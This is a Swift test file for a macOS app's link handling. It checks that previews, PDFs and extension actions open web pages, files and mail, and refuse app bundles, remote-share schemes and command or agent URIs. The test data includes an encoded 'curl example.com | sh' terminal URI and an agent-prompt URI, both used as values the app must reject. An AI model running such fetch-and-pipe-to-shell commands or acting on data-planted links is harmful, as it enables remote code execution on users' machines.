import Foundation
import Testing
import Core
import PDFKit
@testable import KelpApp

/// A preview's links open web pages, the repo's files and mail; an app shipped in a cloned repo, a folder or another
/// app's scheme doesn't open from a click.
@MainActor
@Test func previewLinksOpenPagesAndFilesOnly() throws {
    let repo = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("links-\(UUID().uuidString)")
    let app = repo.appendingPathComponent("docs.app/Contents/MacOS")
    try FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: repo) }
    let readme = repo.appendingPathComponent("README.md")
    try "# hi".write(to: readme, atomically: true, encoding: .utf8)
    try FileManager.default.createSymbolicLink(at: repo.appendingPathComponent("tool"), withDestinationURL: repo.appendingPathComponent("docs.app"))

    #expect(PreviewLinks.target(try #require(URL(string: "https://example.com/x"))) == .web("https://example.com/x"))
    #expect(PreviewLinks.target(readme) == .file(readme.resolvingSymlinksInPath().path))
    #expect(PreviewLinks.target(try #require(URL(string: "mailto:a@b.c"))) == .mail(try #require(URL(string: "mailto:a@b.c"))))
    for refused in [repo.appendingPathComponent("docs.app"), repo, repo.appendingPathComponent("tool"),
                    try #require(URL(string: "smb://host/share")), try #require(URL(string: "ssh://host")),
                    try #require(URL(string: "x-apple.systempreferences:com.apple.preference"))] {
        #expect(PreviewLinks.target(refused) == .refused, "\(refused)")
    }
}

/// An extension's `open` action opens what its data names, but can't run what its data says: a link field set to
/// terminal://…?cmd=… or agent:… by whoever filed the issue. The extension's own template still may.
@MainActor
@Test func anOpenActionCantRunWhatItsDataSays() {
    let item: JSONValue = .obj(["link": "terminal://x?cmd=curl%20example.com%7Csh", "agent": "agent://claude?prompt=go", "url": "https://example.com/i/1"])
    #expect(ExtActions.openURI("${link}", item: item) == nil)
    #expect(ExtActions.openURI("${agent}", item: item) == nil)
    #expect(ExtActions.openURI("${url}", item: item) == "https://example.com/i/1")
    #expect(ExtActions.openURI("terminal://run?cmd=make", item: item) != nil)   // the extension's own words
}

/// A PDF's links go by the same rules: its view has Kelp's delegate (without one, PDFKit opens any link with its app).
@MainActor
@Test func aPDFsLinksGoThroughKelp() throws {
    let url = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("doc-\(UUID().uuidString).pdf")
    defer { try? FileManager.default.removeItem(at: url) }
    let doc = PDFDocument(); doc.insert(PDFPage(), at: 0)
    #expect(doc.write(to: url))
    let view = try #require(Preview.view(for: url) as? PDFView)
    #expect(view.delegate === PDFLinks.shared)
}

/// What an extension's page opens may be data it shows: kelp.open opens pages and files, not commands or agents.
@MainActor
@Test func anExtensionPageOpensPagesNotCommands() {
    #expect(ExtActions.openableURI("terminal://x?cmd=curl%20example.com%7Csh") == nil)
    #expect(ExtActions.openableURI("agent://claude?prompt=go") == nil)
    #expect(ExtActions.openableURI("https://example.com/i/1") == "https://example.com/i/1")
    #expect(ExtActions.openableURI("file:///tmp/a.txt") == "file:///tmp/a.txt")
}
